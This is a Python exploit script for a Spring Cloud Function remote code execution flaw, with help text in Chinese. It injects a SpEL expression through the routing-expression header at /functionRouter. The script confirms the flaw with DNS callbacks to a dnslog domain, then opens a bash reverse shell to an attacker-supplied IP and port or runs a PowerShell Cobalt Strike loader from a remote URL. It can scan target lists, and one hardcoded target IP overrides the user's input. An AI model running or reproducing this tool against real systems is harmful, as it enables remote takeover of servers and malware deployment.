import argparse
import random
import string
import sys
from time import sleep
from function import geturls,banner,oob,geturls,output,getshell
import requests


def poc(url,system,exp,ip,port,cs):
    s = requests.session()
    s.keep_alive = False
    if exp:
        if ip and port:
            if system == "linux":
                payload = 'T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","%s"})' % (getshell.bash_bs64(ip, port))
            else:
                output.fail_p("需要指定系统为linux并指定反弹shell的ip地址和端口")
                exit()
        if cs :
            if system == "win":
                payload = 'T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","%s"})' % (getshell.powershell_bs64(cs))
            else:
                output.fail_p("需要指定系统为win")
                exit()
    else:
        randomStrings = ''.join(random.sample(string.ascii_letters + string.digits, 4))
        # payload = 'T(java.lang.Runtime).getRuntime().exec("nslookup %s.eejw9e.ceye.io")' % randomStrings
        payload = 'T(java.net.InetAddress).getByName("%s.eejw9e.ceye.io")' % randomStrings
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
        "spring.cloud.function.routing-expression": "%s" % payload,
        "Connection": "close"
    }
    try:
        if exp:
            e = requests.post(url=url+'/functionRouter', headers=headers, data='test', timeout=2)
        else:
            r = requests.post(url=url+'/functionRouter', headers=headers, data='test', timeout=2)
            if r.status_code == 500:
                # 等待dnslog刷新日志
                sleep(3)
                pay_dns,add =oob.oob_Dns(randomStrings)
                if randomStrings in pay_dns:
                    output.suc_p("测试目标:%s 存在漏洞,出口ip地址为: %s"%(url,add))
                else:
                    output.info_p("%s/functionRouter 存在,oob测试失败,可能dnslog平台存在异常,可直接尝试反弹shell"% url)
            else:
                output.fail_p("测试目标:%s 漏洞利用失败" % url)
    except Exception as e: 
        # output.fail_p("%s"%e)
        output.fail_p("测试目标:%s 访问出错,请确认url是否正确" % url)


def pocs(file,system,exp,ip,port,cs):
    urls = geturls.get_Targets(file=file, poc=True)
    for url in urls:
        poc(url=url,system=system,exp=exp,ip=ip,port=port,cs=cs)


def get_args():
    url,exp,syst,ip,port,cs,file = "","","","","","",""
    parser = argparse.ArgumentParser(description="Spring Cloud Function RCE 帮助指南")
    parser.add_argument("-u", "--url", dest="url", type=str, help="指定单个url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="指定url列表")
    parser.add_argument("-e", "--exp", dest="exp", action="store_true", help="指定反弹shell模式")
    parser.add_argument("-s", "--system", dest="system",choices=["linux", "win"], type=str, help="指定目标主机操作系统,默认linux,参数为win/linux", default='linux')
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-i","--ipport", dest="ip", type=str, help="指定反弹shell地址和端口,example: -i='vps的ip:监听端口'")
    group.add_argument("-c","--cs",dest="cs", type=str, help="指定cs powershell上线代码的地址,example: -c='http://vps/ps1',此选项必须在windows下运行脚本,会调用本机powershell选项进行poc编码")
    args = parser.parse_args()
    url = args.url
    exp = args.exp
    syst = args.system
    cs = args.cs
    file = args.file
    if args.ip:
        ip, port = args.ip.split(":")[0],args.ip.split(":")[1]
    return url,exp,syst,ip,port,cs,file


def main():
    banner.title()
    if len(sys.argv) > 0:
        url,exp,syst,ip,port,cs,file = get_args()
        url = "http://123.58.236.76:40775"
        if file:
            pocs(file,syst,exp,ip,port,cs)
        else:
            poc(url=url,system=syst,exp=exp,ip=ip,port=port,cs=cs)
    else:
        print("使用python3 spring-cloud-function-rce.py -h 查看帮助")


if __name__ == '__main__' :
    main()